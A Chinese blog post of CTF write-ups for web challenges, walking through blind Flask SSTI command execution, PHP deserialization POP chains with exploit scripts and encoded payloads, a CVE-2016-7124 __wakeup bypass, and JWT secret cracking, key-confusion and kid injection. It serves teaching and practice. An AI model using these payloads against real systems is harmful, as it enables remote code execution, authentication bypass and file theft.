---
title: 青岑CTF有关WEB的WP（一）
description: 关于这几天做了的青岑CTF后写的WP。
date: 2026-04-21 14:18:31
updated: 2026-04-21 14:18:31
image: https://img.yanxisishi.top/images/2026/04/20260421135825273.png
categories: [CTF]
tags: [CTF, WP]
---

## who'ssti revenge

app.py

```python
from flask import Flask, request
from secret import port_num
import socket

app = Flask(__name__)

@app.route('/', methods=['GET','POST'])
def handle_request():
    http_hdr = request.form.get('http_hdr','')
    req = ""
    req += http_hdr
    if req :
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('127.0.0.1',port_num))
        sock.send(req.encode())
        
        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        sock.close()
    return response
    
if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

这附件估计是个假的，或者是初版，反正不是这题的，应该只是想告诉我们这题是 SSTI 吧。

题目是一个 Flask 盲 SSTI。页面提交后总是返回 `{"status":"OK"}`，虽然没有回显，但是输入内容其实会被模板执行。

执行一下盲注payload试试：

```python
{{ url_for.__globals__['os'].popen('sleep(10)').read() }}
```

转了10s才返回结果。那现在跟无回显 RCE 没区别了，先回顾一下 Flask 目录结构：

```txt
远程容器
/
├── app/
│   ├── app.py                 # Flask 主程序
│   ├── requirements.txt
│   ├── start.sh
│   └── static/                # Flask 静态目录（可通过 /static/... 访问）
│      
├── bin -> usr/bin
├── etc/
├── home/
├── proc/
├── root/
├── tmp/
├── usr/
└── var/
```

直接上payload：

```python
{{ url_for.__globals__['os'].popen('cat /app/app.py > /app/static/1.txt 2>&1').read() }}
```

但可惜失败了，访问`/static/1.txt`返回404，说明可能没有 static 的目录，所以需要自己建。

```python
{{ url_for.__globals__['os'].popen('mkdir -p /app/static;cat /app/app.py > /app/static/1.txt 2>&1').read() }}
```

然后访问`/static/1.txt`，得到：

```python
from flask import Flask, jsonify, request, render_template_string, render_template
import sys, random

subZ7ixJXNFsrzTPFaw = ["get_close_matches", "dedent", "sqrt", "fmean", "cos", 
             "listdir", "search", "sleep", "randint", "load", "sum", 
             "exp", "findall", "factorial", "mean", "choice", "listdir"]
need_List = random.sample(subZ7ixJXNFsrzTPFaw, 5)
need_List = dict.fromkeys(need_List, 0)
subrHxWo0PDYUxc8Xzc = False
sub5t7og9jeZJZlBZSS = __import__("os").environ.get("ICQ_FLAG", "flag{test_flag}")
# 清除 ICQ_FLAG
__import__("os").environ["ICQ_FLAG"] = ""

def trace_calls(frame, event, arg):
  if event == 'call':
    func_name = frame.f_code.co_name
    # print(func_name)
    if func_name in need_List:
      need_List[func_name] = 1
    # if all(need_List.values()):
    #   global subrHxWo0PDYUxc8Xzc
    #   subrHxWo0PDYUxc8Xzc = True
  return trace_calls


app = Flask(__name__)
@app.route('/', methods=["GET", "POST"])
def index():
  submit = request.form.get('submit')
  if submit:
    sys.settrace(trace_calls)
    print(render_template_string(submit))
    sys.settrace(None)
    if subrHxWo0PDYUxc8Xzc:
      return jsonify({"flag": sub5t7og9jeZJZlBZSS})
    return jsonify({"status": "OK"})
  return render_template_string('''<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="UTF-8">
    <title>首页</title>
</head>
<body>
    <h1>提交你的代码，让后端看看你的厉害！</h1>
    <form action="/" method="post">
        <label for="submit">提交一下：</label>
        <input type="text" id="submit" name="submit" required>
        <button type="submit">提交</button>
    </form>
    <div style="margin-top: 20px;">
        <p> 尝试调用到这些函数！ </p>
    {% for func in funcList %}
        <p>{{ func }}</p>
    {% endfor %}
    <div style="margin-top: 20px; color: red;">
        <p> 你目前已经调用了 {{ called_funcs|length }} 个函数：</p>
        <ul>
        {% for func in called_funcs %}
            <li>{{ func }}</li>
        {% endfor %}
        </ul>
    </div>
</body>
<script>
    
</script>
</html>

                                '''
                                , 
                                funcList = need_List, called_funcs = [func for func, called in need_List.items() if called])

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=5000, debug=False)
```

成功拿到 app.py 的源码。

目的是为了拿flag，所以优先找到返回flag的代码：

```python
sub5t7og9jeZJZlBZSS = __import__("os").environ.get("ICQ_FLAG", "flag{test_flag}")
```

以及：

```python
if subrHxWo0PDYUxc8Xzc:
      return jsonify({"flag": sub5t7og9jeZJZlBZSS})
```

然后找`subrHxWo0PDYUxc8Xzc`，发现：

```python
subrHxWo0PDYUxc8Xzc = False
```

所以只要让`subrHxWo0PDYUxc8Xzc = True`就可以拿到flag了。

刚刚命令执行使用 `os` ，但改 python 变量时用 `__builtins__` 更便捷。上payload：

```python
{{ url_for.__globals__['__builtins__'].exec("import __main__; __main__.subrHxWo0PDYUxc8Xzc=True") }}
```

即执行了以下代码：

```python
import __main__
__main__.subrHxWo0PDYUxc8Xzc = True
```

然后返回flag。

## basic_7

是一个小游戏，先查看源码找到游戏完成后的返回逻辑（一般在源码中间偏后）。

```js
const response = await fetch('/complete.php', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
        csrf,
        solved: '1'
    }),
    redirect: 'follow'
});
```

然后在再源码中 `ctrl + f` 查找 `csrf` 字样，找到：

```js
const csrf = "442379e0eee695ca92bfe7cd0f269a17";
```

所以思路一：

按 F12 打开 Console ，输入以下 JS 代码：

```js
fetch('/complete.php', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
        csrf: '442379e0eee695ca92bfe7cd0f269a17',
        solved: '1'
    }),
    redirect: 'follow'
});
```

查看 Network ，发现新增响应有 `compelete.php(302)` 、`vault.php(302)` 、 `decoy.php(200)` ，且返回逻辑是：

```txt
小游戏完成 -> compelete.php -> vault.php -> decoy.php
```

`/decoy.php` 中没有flag，那就应该在重定向中了。但访问 `/vault.php` 后直接跳转到了 `/decoy.php`。此时只需要bp抓包找flag即可。

![image-20260411122143708](https://img.yanxisishi.top/images/2026/04/image-20260411122143708.png)

思路二：

页面的按钮虽然不能按，但众所周知，前端的防御基本没有意义， F12 把按钮的标签中的 `disabled` 属性删掉就行了，然后就能正常点击。

但点击后直接跳转到了 `/decoy.php` ，且没有返回flag，此时会意识到中间存在一个重定向的过程。

这次重新点击按钮，但同时用bp抓包，得到：

![image-20260411122627913](https://img.yanxisishi.top/images/2026/04/image-20260411122627913.png)

在响应结果中注意到 `Location: /vault.php` ，说明接下来应该跳转到 `/vault.php` 。

再再bp中把路径改成访问 `/vault.php` ，同上得到flag。

## 解冻

打开控制台查看源码，发现一堆注释了的flag在闪。

先随便截一张图：

![image-20260412205815472](https://img.yanxisishi.top/images/2026/04/image-20260412205815472.png)

结合题目描述的`e i e i e i e a o`，且其他flag太假了，关键flag应该是：

```html
<!--Here's your flag： eiieeiieeiieiieeeiieeeeieiieeiiieiiiieiieeiieeieeeiieieieeiiieeeeiie-->
```

这串字符是由两个字符 `e` 和 `i` 组成，容易联想到二进制。

替换为 `0` 和 `1` 即可得到`01100110011011000110000101100111011110110011001000110101001110000110`

转成十六进制后得到`666c61677b3235386`

转ASCII码后得到`flag{258`（但是只有取五部分的开头或者结尾才能保证结果绝对正常，最好是开头，因为会有提示`Here's your flag：`，取中间的可能乱码，真正的flag要五部分拼在一起后转进制）

可以看到是部分flag，剩下还有四部分可以通过不断截图得到，也可以让ai帮忙写一个脚本：

```js
window.S = window.S || new Set(); setInterval(() => document.body.innerHTML.match(/[ei]{16,}/g)?.forEach(s => !S.has(s) && (console.log(s), S.add(s))), 50);
```

![image-20260412212031448](https://img.yanxisishi.top/images/2026/04/image-20260412212031448.png)

全拼接在一起后变成二进制再变成十六进制再变成字符串即可。

## EZPOP

```php
<?php
$flag = file_get_contents("/flag");
class ShowFlag {
    public $show = false;

    public function __destruct() {
        if ($this->show) {
            echo $GLOBALS['flag'];
        }
    }
}

highlight_file(__FILE__);

if (isset($_GET['data'])) {
    unserialize($_GET['data']);
}
?>
```

主要看：

```php
if ($this->show) {
    echo $GLOBALS['flag'];
}
```

即 `$this->show` 为 `True` 即可。

```php
<?php
class ShowFlag {
    public $show = TRUE;
}

$a = new ShowFlag();
echo serialize($a);
```

得到 `O:8:"ShowFlag":1:{s:4:"show";b:1;}`

## EZPOP_1

```php
<?php

class ShowFlag {
    public $show = false;
    public $code = "";

    public function __destruct() {
        if ($this->show) {
            eval($this->code);
        }
    }
}

if (isset($_COOKIE["data"])) {
    unserialize($_COOKIE["data"]);
}

highlight_file(__FILE__);
```

跟上题也没差多少：

```php
<?php
class ShowFlag {
    public $show = True;
    public $code = "phpinfo();";
}

$a = new ShowFlag();
echo serialize($a);
```

得到：

```txt
O:8:"ShowFlag":2:{s:4:"show";b:1;s:4:"code";s:10:"phpinfo();";}
```

需要注意的就是，因为本题用 Cookie 传的， **Cookie 中使用分号 `;` 会被解析成两个 Cookie 值的分隔号**，记得 URL 编码即可。

## EZPOP_2

```php
<?php
$flag = file_get_contents("/flag");

class Fracture {
    public $delegate;

    public function __destruct() {
        if ($this->delegate) {
            $this->delegate->disperse();
        }
    }
}

class Specter {
    public $latch = false;

    public function __toString() {
        if ($this->latch) {
            return $GLOBALS['flag'];
        }
        return "no";
    }
}

class Thunk {
    public $operand;

    public function __invoke() {
        echo $this->operand;
    }
}

class Conduit {
    public $handler;

    public function disperse() {
        $f = $this->handler;
        return $f();
    }
}

highlight_file(__FILE__);

if (isset($_COOKIE['data'])) {
    unserialize($_COOKIE['data']);
}
?>
```

像这种构造 pop 链，先找终点：

```php
if ($this->latch) {
    return $GLOBALS['flag'];
}
```

位于 `class Specter` 中，需要触发 `__toString` 。

PHP 手册中这么介绍的：

`__toString()` 方法用于一个类被当成字符串时应怎样回应。例如 `echo $obj;` 应该显示些什么。

找到一个类被当成字符串的代码：

```php
echo $this->operand;
```

位于 `class Thunk` 中，需要触发 `__invoke` 。

PHP 手册中这么介绍的：

当尝试以调用函数的方式调用一个对象时，`__invoke`方法会被自动调用。

找到以调用函数的方式调用一个对象的代码：

```php
return $f();
```

位于 `class Conduit` 中，需要触发 `disperse()` 。

`disperse()` 是本题原创的一个函数，而不像先前那些是通用魔术方法，找到该函数触发的位置：

```php
if ($this->delegate) {
    $this->delegate->disperse();
}
```

位于 `class Fracture` 中，需要触发 `__destruct` 。

PHP 手册中这么介绍的：

析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。

实际上，当 PHP 的垃圾回收机制（GC）发现内存里的这个对象没用时，会把它清理掉，在清理的最后一刻自动调用该方法。**由于太过容易被触发，  `__destruct` 常常作为反序列化的起点。**

总结一下：

```txt
Fracture::__destruct()
→ Conduit::disperse()
→ Thunk::__invoke()
→ Specter::__toString()
→ return $GLOBALS['flag']
```

根据刚刚的顺序逆推 pop 链的构造即可。

```php
<?php
class Fracture {
    public $delegate = True;
}

class Specter {
    public $latch = True;
}

class Thunk {
    public $operand;
}

class Conduit {
    public $handler;
}

$a = new Fracture();
$a -> delegate = new Conduit();
$a -> delegate -> handler = new Thunk();
$a -> delegate -> handler -> operand = new Specter();
echo urlencode(serialize($a));
```

得到：

```txt
O%3A8%3A%22Fracture%22%3A1%3A%7Bs%3A8%3A%22delegate%22%3BO%3A7%3A%22Conduit%22%3A1%3A%7Bs%3A7%3A%22handler%22%3BO%3A5%3A%22Thunk%22%3A1%3A%7Bs%3A7%3A%22operand%22%3BO%3A7%3A%22Specter%22%3A1%3A%7Bs%3A5%3A%22latch%22%3Bb%3A1%3B%7D%7D%7D%7D
```

## EZPOP_3

```php
<?php
class Chrysalis {
    public $vector;

    public function __wakeup() {
        if ($this->vector) {
            $this->vector->catalyze();
        }
    }

    public function __destruct() {
        if ($this->vector) {
            $this->vector->expunge();
        }
    }
}

class Pulsar {
    public $token;

    public function __invoke() {
        echo $this->token;
    }
}


class Stratum {
    public $binding;

    public function __call($name, $args) {
        $f = $this->binding->$name;
        return $f();
    }
}

class Lattice {
    public $facet;

    public function expunge() {
        if ($this->facet instanceof Sluice) {
            $this->facet->drain();
        }
    }

    public function catalyze() {
        if ($this->facet) {
            $this->facet->surge();
        }
    }
}

class Lexicon {
    public $ambit;

    public function __get($name) {
        return $this->ambit;
    }
}


class Mirage {
    public $latch = false;
    public $a;

    public function __toString() {
        if ($this->latch) {
            eval($this->a);
            return '';
        }
        return "no";
    }
}

class Sluice {
    public function drain() {
        echo "decoy end\n";
    }
}

highlight_file(__FILE__);

if (isset($_GET['data'])) {
    unserialize($_GET['data']);
}
?>
```

终点在：

```php
if ($this->latch) {
    eval($this->a);
    return '';
}
```

可以用 `ctrl + f` 找 `echo` ，上一步在：

```php
echo $this->token;
```

上一步在：

```php
$f = $this->binding->$name;
return $f();
```

PHP 手册中这么介绍 `__call` ：

在对象中调用一个不可访问方法时，`__call()` 会被调用。

找找源码中的原创方法： `catalyze()` 、 `expunge()` 、 `drain()` 、 `surge()` 。注意到只有 `surge()` 是没有定义即不存在的方法。

则上一步在：

```php
if ($this->facet) {
    $this->facet->surge();
}
```

但是！实际上不能直接把上一步交给 `__call` ，原因是假设exp为：

```php
$c = new Lattice();
$c -> facet = new Stratum();
$c -> facet -> binding = new Pulsar();
```

那么代码：

```php
public function __call($name, $args) {
    $f = $this->binding->$name;
    return $f();
}
```

中的 `$f = $this->binding->$name;` 就等价于 `$f = (new Pulsar())->surge;` 

> 因为这里触发 `__call()` 的位置是 `$this->facet->surge()`，而 `class Stratum` 中并不存在 `surge()` 方法，所以 PHP 会自动调用 `__call($name, $args)`，并将调用的方法名 `"surge"` 赋给 `$name`。因此 `$this->binding->$name` 实际上等价于 `$this->binding->surge`。

但是 **`class Pulsar` 中只存在属性 `token` ，并不存在所谓的属性 `surge` ，直接访问不存在的属性会导致结果变成非预想的报错结果（链条中断）**，这里需要用源码中存在的另一个魔术方法 `__get` 过渡。

PHP 手册中这么介绍 `__get` ：

读取不可访问（protected 或 private）或不存在的属性的值时， `__get()` 会被调用。

因此真正的上一步是：

```php
public function __get($name) {
    return $this->ambit;
}
```

当前一步出现了 `$f = $this->binding->$name;` ，这一步就会实现 `return $this->ambit;` ，**把不存在属性访问的报错结果，定向变成 `$this->ambit`，也就是后面构造的的 `class Pulsar` 对象**。

然后上一步才是：

```php
$f = $this->binding->$name;
return $f();
```

和

```php
if ($this->facet) {
    $this->facet->surge();
}
```

接着上一步在：

```php
if ($this->vector) {
    $this->vector->catalyze();
}
```

PHP 手册中这么介绍 `__wakeup` ：

`unserialize()` 会检查是否存在一个 `__wakeup()` 方法。如果存在，则会先调用 `__wakeup` 方法，预先准备对象需要的资源。`__wakeup()` 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。

**反序列化时会自动触发 `__wakeup()`，所以它可以作为 POP 链入口。**

至于其余方法如 `__destruct()`、`expunge()`、`drain()` 等删掉就行了。

总结一下：

```txt
Chrysalis::__wakeup()
→ Lattice::catalyze()
→ Stratum::__call("surge", [])
→ Lexicon::__get("surge")
→ Pulsar::__invoke()
→ echo Mirage
→ Mirage::__toString()
→ eval($this->a)
```

逆推写出exp脚本：

```php
<?php
class Chrysalis {
    public $vector = true;
}

class Pulsar {
    public $token;
}

class Stratum {
    public $binding;
}

class Lattice {
    public $facet = true;
}

class Lexicon {
    public $ambit;
}

class Mirage {
    public $latch = true;
    public $a = "phpinfo();";
}

$a = new Chrysalis();
$a -> vector = new Lattice();
$a -> vector -> facet = new Stratum();
$a -> vector -> facet -> binding = new Lexicon();
$a -> vector -> facet -> binding -> ambit= new Pulsar();
$a -> vector -> facet -> binding -> ambit -> token = new Mirage();
echo serialize($a);
```

得到：

```txt
O:9:"Chrysalis":1:{s:6:"vector";O:7:"Lattice":1:{s:5:"facet";O:7:"Stratum":1:{s:7:"binding";O:7:"Lexicon":1:{s:5:"ambit";O:6:"Pulsar":1:{s:5:"token";O:6:"Mirage":2:{s:5:"latch";b:1;s:1:"a";s:10:"phpinfo();";}}}}}}
```

## EZPOP_4

```php
<?php
error_reporting(0);

class ObsidianSanctum {
    public $note = "guest";
    public $flareValue = "";
    protected $gate = "";
    private $echoer;

    public function __destruct() {
        if (md5(md5($this->note)) == md5($this->gate)) {
            if (isset($this->echoer)) {
                $this->echoer->flare = $this->flareValue;
            }
        }
    }
}

class SpectralPrism {
    public $engine;
    public $payload;

    public function __set($name, $value) {
        if ($name === "flare" && $value === "ignite") {
            $runner = $this->engine;
            if (is_callable($runner)) {
                $runner($this->payload);
            } else {
                die("Denied.\n");
            }
        }
    }
}

class RuntimeScript {
    public function __invoke($source) {
        if (!is_string($source)) {
            die("Denied.\n");
        }
        eval($source);
    }
}

highlight_file(__FILE__);

if (isset($_GET['data'])) {
    unserialize($_GET['data']);
}
?>
```

终点是：

```php
if ($name === "flare" && $value === "ignite") {
    $runner = $this->engine;
    if (is_callable($runner)) {
        $runner($this->payload);
    }
```

> is_callable — 验证值是否可以在当前范围内作为函数调用

要满足 `if ($name === "flare" && $value === "ignite")` ，即传入对象属性名为 `flare` 且属性值为 `ignite` 。

PHP 手册中这么介绍 `__set` ：

在给不可访问（protected 或 private）或不存在的属性赋值时，`__set()` 会被调用。

则上一步在：

```php
class ObsidianSanctum {
    public $note = "guest";
    public $flareValue = "";
    protected $gate = "";
    private $echoer;

    public function __destruct() {
        if (md5(md5($this->note)) == md5($this->gate)) {
            if (isset($this->echoer)) {
                $this->echoer->flare = $this->flareValue;
            }
        }
    }
}
```

1. 首先要满足 `if (md5(md5($this->note)) == md5($this->gate))`

   只需要在本地执行：

   ```php
   <?php
   echo md5('guest');
   ```

   得到 `guest` 的 md5 值为 `084e0343a0486ff05530df6c705c8bb4` 。因此为属性 `gate` 赋值 `084e0343a0486ff05530df6c705c8bb4`

2. 其次要满足 `if (isset($this->echoer))`

   意思是判断属性 `echoer` 是否已被设置且不为 `null`。

   但由于此处属性 `echoer` 是 protected 属性，对这种属性赋值可以通过构造函数的方法，例如：

   ```php
   public function __construct() {
       $this->echoer = new SpectralPrism();
   }
   ```

至于 `eval($source);` 可以不用理会了。

总结一下：

```txt
ObsidianSanctum::__destruct()
→ SpectralPrism::__set("flare", "ignite")
→ system('cat /flag')
```

exp为：

```php
<?php
class ObsidianSanctum {
    public $note = "guest";
    public $flareValue = "ignite";
    protected $gate = "084e0343a0486ff05530df6c705c8bb4";
    private $echoer;

    public function __construct() {
        $this->echoer = new SpectralPrism();
    }
}

class SpectralPrism {
    public $engine = "system";
    public $payload = "cat /flag";
}

$a = new ObsidianSanctum();
echo urlencode(serialize($a));
```

得到：

```txt
O%3A15%3A%22ObsidianSanctum%22%3A4%3A%7Bs%3A4%3A%22note%22%3Bs%3A5%3A%22guest%22%3Bs%3A10%3A%22flareValue%22%3Bs%3A6%3A%22ignite%22%3Bs%3A7%3A%22%00%2A%00gate%22%3Bs%3A32%3A%22084e0343a0486ff05530df6c705c8bb4%22%3Bs%3A23%3A%22%00ObsidianSanctum%00echoer%22%3BO%3A13%3A%22SpectralPrism%22%3A2%3A%7Bs%3A6%3A%22engine%22%3Bs%3A6%3A%22system%22%3Bs%3A7%3A%22payload%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D
```

**注：** 由于 Payload 中包含 `protected` 和 `private` 属性，PHP 在序列化时会产生不可见的空字符（`\x00`）。如果直接输出并复制，会导致空字符丢失、长度不匹配从而反序列化失败（即使**在代码输出完后再 URL 编码也不行**）。因此必须在 PHP 脚本内部直接套一层 `urlencode()`，将空字符转化为 `%00` 后再复制使用。

## EZPOP_5

```php
<?php
class ChronoVault {
    public $memo = "guest";
    protected $token = "none";
    private $isAdmin = false;
    public $bridge;

    public function __wakeup() {
        $this->token = "none";
        $this->isAdmin = false;
    }

    public function __destruct() {
        if ($this->isAdmin && $this->token === "QCCTFyyds" && isset($this->bridge)) {
            $this->bridge->fire($this->memo);
        }
    }
}

class DirectiveEngine {
    public $sandbox;

    public function __invoke() {
        return ($this->sandbox)();
    }
}

class EventBridge {
    public $engine;

    public function __call($name, $args) {
        return ($this->engine)();
    }
}

class ExecutionSandbox {
    public $script;

    public function __invoke() {
        if (preg_match("/flag/i", $this->script)) {
            die("Denied.\n");
        }
        eval($this->script);
    }
}

highlight_file(__FILE__);

if (isset($_GET['data'])) {
    unserialize($_GET['data']);
}
?>
```

终点是：

```php
public function __invoke() {
    if (preg_match("/flag/i", $this->script)) {
        die("Denied.\n");
    }
    eval($this->script);
}
```

位于 `class ExecutionSandbox` 中，存在正则过滤了 `flag` 关键字，可以使用通配符 `fl*` 绕过，例如传入 `system('cat /fl*');`。

上一步在：

```php
public function __call($name, $args) {
    return ($this->engine)();
}
```

位于 `class EventBridge` 中，需要触发 `__call`。

上一步在：

```php
public function __destruct() {
    if ($this->isAdmin && $this->token === "QCCTFyyds" && isset($this->bridge)) {
        $this->bridge->fire($this->memo);
    }
}
```

位于 `class ChronoVault` 中。这里调用了不存在的 `fire()` 方法，正好可以触发 `EventBridge` 的 `__call`。

为了执行到 `$this->bridge->fire($this->memo);`，必须满足 if 条件： `$this->isAdmin` 为 `true`，且 `$this->token` 为 `"QCCTFyyds"`。

但是这里存在一个问题：

```php
public function __wakeup() {
    $this->token = "none";
    $this->isAdmin = false;
}
```

`__wakeup()` 会在反序列化中被触发并把 `$token` 和 `$isAdmin` 的值重置，导致无法进入 if 判断。

**CVE-2016-7124** 该漏洞的影响版本范围精确如下：

- PHP 5.x < 5.6.25
- PHP 7.x < 7.0.10

**当序列化字符串中表示对象属性个数的值大于真实的属性个数时，`__wakeup()` 将会被跳过执行。** 在生成序列化字符串后，将其中的属性个数从 4 改为 5 即可（将 ChronoVault 的属性数量从 4 改为 5，绕过 __wakeup）。

用 whatweb 查出来本题 PHP 版本是 7.0.9 ，可以利用该漏洞。

总结一下：

```txt
ChronoVault::__destruct() (绕过 __wakeup)
→ EventBridge::__call("fire", [$this->memo])
→ ExecutionSandbox::__invoke()
→ eval($this->script)
```

逆推写出exp脚本：

```php
<?php
class ChronoVault {
    public $memo = "guest";
    protected $token = "QCCTFyyds";
    private $isAdmin = true;
    public $bridge;
}

class EventBridge {
    public $engine;
}

class ExecutionSandbox {
    public $script = "phpinfo();";
}

$a = new ChronoVault();
$a -> bridge = new EventBridge();
$a -> bridge -> engine = new ExecutionSandbox();
echo urlencode(serialize($a));
```

得到：

```txt
O%3A11%3A%22ChronoVault%22%3A4%3A%7Bs%3A4%3A%22memo%22%3Bs%3A5%3A%22guest%22%3Bs%3A8%3A%22%00%2A%00token%22%3Bs%3A9%3A%22QCCTFyyds%22%3Bs%3A20%3A%22%00ChronoVault%00isAdmin%22%3Bb%3A1%3Bs%3A6%3A%22bridge%22%3BO%3A11%3A%22EventBridge%22%3A1%3A%7Bs%3A6%3A%22engine%22%3BO%3A16%3A%22ExecutionSandbox%22%3A1%3A%7Bs%3A6%3A%22script%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D%7D
```

改成：

```txt
O%3A11%3A%22ChronoVault%22%3A5%3A%7Bs%3A4%3A%22memo%22%3Bs%3A5%3A%22guest%22%3Bs%3A8%3A%22%00%2A%00token%22%3Bs%3A9%3A%22QCCTFyyds%22%3Bs%3A20%3A%22%00ChronoVault%00isAdmin%22%3Bb%3A1%3Bs%3A6%3A%22bridge%22%3BO%3A11%3A%22EventBridge%22%3A1%3A%7Bs%3A6%3A%22engine%22%3BO%3A16%3A%22ExecutionSandbox%22%3A1%3A%7Bs%3A6%3A%22script%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D%7D
```

## EZPOP_6

```php
<?php
//经常做复杂的链子对身体不好，我们来个简单的吧
$flag = file_get_contents("/flag");

class A {
    public $obj;

    public function __destruct() {
        if (is_object($this->obj)) {
            echo $this->obj;
        }
    }
}

class B {
    public $data;

    public function __toString() {
        return $this->data->run();
    }
}

class C {
    public $qcctf = "nope";

    public function run() {
        if ($this->qcctf === "get_flag") {
            return $GLOBALS['flag'];
        }
        return "";
    }
}

highlight_file(__FILE__);

if (isset($_GET['data'])) {
    $data = str_replace("flag", "", $_GET['data']);
    @unserialize($data);
}
?>
```

先看终点：

```php
public function run() {
    if ($this->qcctf === "get_flag") {
        return $GLOBALS['flag'];
    }
    return "";
}
```

位于 `class C` 中。

只要让属性 `$qcctf === "get_flag"`，调用 `run()` 时就会返回 flag。

那么上一步就是：

```php
public function __toString() {
    return $this->data->run();
}
```

位于 `class B` 中，需要触发 `__toString()`。

继续往上找哪里把对象当成字符串输出了：

```php
public function __destruct() {
    if (is_object($this->obj)) {
        echo $this->obj;
    }
}
```

位于 `class A` 中。

这里 `echo $this->obj;` 会把对象当成字符串输出，因此会触发 `B::__toString()` 。

而 `__destruct()` 又会在对象销毁时自动调用，所以它就是这题的入口。

总结一下链子：

```txt
A::__destruct()
→ echo $this->obj
→ B::__toString()
→ C::run()
→ return $GLOBALS['flag']
```

逆推构造 exp 即可。

```php
<?php
class A {
    public $obj;
}

class B {
    public $data;
}

class C {
    public $qcctf = "get_flag";
}

$a = new A();
$a -> obj = new B();
$a -> obj -> data = new C();
echo serialize($a);
```

得到：

```txt
O:1:"A":1:{s:3:"obj";O:1:"B":1:{s:4:"data";O:1:"C":1:{s:5:"qcctf";s:8:"get_flag";}}}
```

但是这里要注意源码最后还有一句：

```php
$data = str_replace("flag", "", $_GET['data']);
```

它会把传入序列化字符串中的 `flag` 直接替换为空，双写绕过即可：

```txt
O:1:"A":1:{s:3:"obj";O:1:"B":1:{s:4:"data";O:1:"C":1:{s:5:"qcctf";s:8:"get_flaflagg";}}}
```

## EZJWT

题目考察点挺明显的—— JWT ，这里用的是 bp 插件 JWT Editor。

bp 抓包后也是看到被自动识别出来了是 HS256 对称式签名。

![image-20260420210239259](https://img.yanxisishi.top/images/2026/04/image-20260420210239259.png)

HS256 对称式签名很大概率是考察密钥爆破，这里可以用 Hashcat 或 jwt_tool 进行爆破，字典选用的 rockyou.txt ，得到密钥是 secret 。

接着进入 bp 上方的 `JWT Editor` 界面，选择 `New Symmetic Key` ，点击生成，将 k 值修改为 Base64URL 编码后的密钥，即 c2VjcmV0 。

> Base64URL是标准Base64编码的“URL安全版”，它直接在编码底层将Base64中容易引起网络传输冲突的 `+` 和 `/` 替换为 `-` 和 `_`，并舍弃了末尾的 `=` 填充符，从而生成无需二次转码即可安全传输的紧凑字符串。

![image-20260420211204171](https://img.yanxisishi.top/images/2026/04/image-20260420211204171.png)

确认后回到 `Repeater` 界面，把 guest 全改为 admin ，点击 Sign ，选刚刚生成的key就可以了。

## EZJWT_1

![image-20260420211456467](https://img.yanxisishi.top/images/2026/04/image-20260420211456467.png)

这次是 RS256 非对称式加密签名。

查看源码找到公钥 `pubkey.pem` ，下载后内容为：

```txt
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCn2Kx1MVVUY32mLxxgIrt8z/3Y
CWB1SiWArOmdMtG9Kt9f+fQHqSY8Z9Gri2Mx6butJGhbOGjutuaxC3SH3r/7urGD
0wI7qqRMgw5pAVvN4eF/1WGSiqtAKYK5H2dOhd3MJh+qQyvF4s9UaLw3TF6KRR5c
r5qRgRgQkqQ4Xli69QIDAQAB
-----END PUBLIC KEY-----
```

既然没有泄露密钥，那就应该是密钥混淆攻击（RS256=>HS256）

首先把公钥转成 Base64URL 编码格式：

```bash
cat pubkey.pem | base64 -w 0 | tr '+/' '-_' | tr -d '='
```

得到：

```txt
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDbjJLeDFNVlZVWTMybUx4eGdJcnQ4ei8zWQpDV0IxU2lXQXJPbWRNdEc5S3Q5ZitmUUhxU1k4WjlHcmkyTXg2YnV0SkdoYk9HanV0dWF4QzNTSDNyLzd1ckdECjB3STdxcVJNZ3c1cEFWdk40ZUYvMVdHU2lxdEFLWUs1SDJkT2hkM01KaCtxUXl2RjRzOVVhTHczVEY2S1JSNWMKcjVxUmdSZ1FrcVE0WGxpNjlRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo
```

接着进入 bp 上方的 `JWT Editor` 界面，选择 `New Symmetic Key` ，点击生成，将 k 值修改为上述 Base64URL 编码后的公钥 。

![image-20260420212427549](https://img.yanxisishi.top/images/2026/04/image-20260420212427549.png)

确认后回到 `Repeater` 界面，把 RS256 改成 HS256 ，把 guest 全改为 admin ，点击 Sign ，选刚刚生成的key就可以了。

## EZJWT_2

![image-20260420214626822](https://img.yanxisishi.top/images/2026/04/image-20260420214626822.png)

又是 HS256 对称式签名，但是密钥爆破不出来，而且 None 算法绕过签名失败。 **突破口是本题新出现的 kid 参数** 。

`kid` 是 **Key ID** 的缩写，它是 JSON Web Token (JWT) 标准中定义的一个可选标头（Header）参数。简单来说，**`kid` 的作用是指示用来验证该 JWT 签名的特定密钥（Key）** 。

如果后端开发者在代码逻辑中盲目信任 `kid` 的值，并且没有进行严格的安全过滤，就可能导致：

1. 基于文件系统（产生目录遍历）

   如果后端将密钥作为文件存储在服务器本地，代码必然调用文件读取函数。

   此时可以通过目录遍历（`../`）将读取路径指向操作系统的特殊设备文件，强行令后端的验证密钥变成已知状态。

2. 基于数据库（产生 SQL 注入）

   如果后端将密钥存储在数据库中，并将 `kid` 直接带入 SQL 查询语句（例如 `SELECT key FROM keys_table WHERE kid = '$kid'`）。此时如果缺乏过滤，可以构造类似 `admin' UNION SELECT 'my_key'#` 的 Payload，利用联合查询强行让数据库返回一个自定义的字符串（如 `my_key`）作为验证密钥，随后在本地用该自定义密钥签名即可绕过。

